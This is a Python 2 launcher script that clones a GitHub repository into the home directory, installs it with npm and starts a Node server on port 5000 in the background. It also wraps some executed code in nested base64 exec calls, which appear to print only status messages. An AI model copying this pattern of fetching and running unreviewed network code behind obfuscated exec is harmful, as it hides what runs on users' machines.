#coding=utf-8
#!/usr/bin/python2
#This Script Write By Tech Baba
#Do Not Copy This Script :)
try:
    import os
    import sys
    import time
    import urllib
    import base64
    import platform
    import requests
except ImportError:
    os.system('pip2 install requests') #Module Not found Eror :(

#Loding Funcation :)
def baba(word):
    lix = ["[\033[1;92m■\033[1;97m□□□□□□□□□□□□□]","[\033[1;93m■■\033[1;97m□□□□□□□□□□□□]", "[\033[1;94m■■■\033[1;97m□□□□□□□□□□□]", "[\033[1;96m■■■■\033[1;97m□□□□□□□□□□]", "[\033[1;95m■■■■■\033[1;97m□□□□□□□□□]", "[\033[1;97m■■■■■■\033[1;97m□□□□□□□□]", "[\033[1;93m■■■■■■■\033[1;97m□□□□□□□]", "[\033[1;91m■■■■■■■■\033[1;97m□□□□□□]", "[\033[1;96m■■■■■■■■■\033[1;97m□□□□□]", "[\033[1;92m■■■■■■■■■■\033[1;97m□□□□]", "[\033[1;94m■■■■■■■■■■■\033[1;97m□□□]", "[\033[1;95m■■■■■■■■■■■■\033[1;97m□□]", "[\033[1;93m■■■■■■■■■■■■■\033[1;97m□]", "[\033[1;92m■■■■■■■■■■■■■■\033[1;97m]"]
    for i in range(3): #round
        for x in range(len(lix)):
            sys.stdout.write(('\r{}{}').format(str(word), lix[x]))
            time.sleep(0.08) #time
            sys.stdout.flush()

# localhost file no found :(
if not os.path.isfile('/$HOME/.host'):
    os.system("cd /$HOME && git clone https://github.com/TECH-BABA/.host")

# logo on base64 :)
logo_base = 'G1swOzk3bQkkJCQkJCQkJCAgJCQkJCQkJCQgICQkICAgICAkJAoJJCQgICAgICQkICQkICAgICAkJCAgJCQgICAkJAoJJCQgICAgICQkICQkICAgICAkJCAgICQkICQkCgkkJCQkJCQkJCAgJCQgICAgICQkICAgICQkJAoJJCQgICAkJCAgICQkICAgICAkJCAgICQkICQkCgkkJCAgICAkJCAgJCQgICAgICQkICAkJCAgICQkCgkkJCAgICAgJCQgJCQkJCQkJCQgICQkICAgICAkJAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQogfHwgG1swOzk3bRtbMDs0MW0gUHJvZ3JhbW1pbmcgaXMgdGhpbmtpbmcgbm90IHR5cGluZyA6KSAbWzBtIHx8Ci0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tChtbMDs5N20g4p6kIEF1dGhvciAgOiBZZXN3YW50IE1pc2hyYQobWzA7OTdtIOKepCBWZXJzaW9uIDogMy4wChtbMDs5N20g4p6kIGZiLXBhZ2UgOiBodHRwczovL2ZiLmNvbS9UZWNobmljYWwuTWlzaHJhCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t'
logo = base64.b64decode(logo_base) # logo with base64 encodeing :)

def home():
    os.system("clear")
    print logo
    baba('   Server Conecting =>')
    os.system("clear")
    print logo
    print""
    exec(base64.b64decode("I0NvZGUgRW5jcnlwdGVkIEJ5IFRlY2ggQmFiYQppbXBvcnQgYmFzZTY0CmV4ZWMoYmFzZTY0LmI2NGRlY29kZSgiSTBOdlpHVWdSVzVqY25sd2RHVmtJRUo1SUZSbFkyZ2dRbUZpWVFwcGJYQnZjblFnWW1GelpUWTBDbVY0WldNb1ltRnpaVFkwTG1JMk5HUmxZMjlrWlNnaVkwaEtjR0p1VVc5SmFVSllXVmRzTUVsRlduWmphVUpFWWpJMWJGa3pVV2RpUnpscVdWZDRiMkl6VGpCSmFXdExJaWtwIikp"))
    os.system('cd /$HOME/.host && npm install')
    os.system('fuser -k 5000/tcp &')
    os.system('#')
    os.system('#')
    os.system('cd /$HOME/.host && node index.js &')
    time.sleep(6)
    os.system("clear")
    print logo
    exec(base64.b64decode("I0NvZGUgRW5jcnlwdGVkIEJ5IFRlY2ggQmFiYQppbXBvcnQgYmFzZTY0CmV4ZWMoYmFzZTY0LmI2NGRlY29kZSgiSTBOdlpHVWdSVzVqY25sd2RHVmtJRUo1SUZSbFkyZ2dRbUZpWVFwcGJYQnZjblFnWW1GelpUWTBDbVY0WldNb1ltRnpaVFkwTG1JMk5HUmxZMjlrWlNnaVkwaEtjR0p1VVc5SmJIZDNUWHBPWWsxVWN6Vk5iVEZVV2xoS01scFlTV2RXTW14ellrTkNRMXBUUWtSaU1qVnNXVE5SWjFRelFteGlhVUZuVVZoQ2QySkhiR3BaV0ZKd1lqSTBhVXRUTldwYVZ6VXdXbGhKYjA1VVFYQkRaejA5SWlrcCIpKQ=="))
    print 47*("-")
    os.system("exit")

if __name__ == '__main__':
    home()


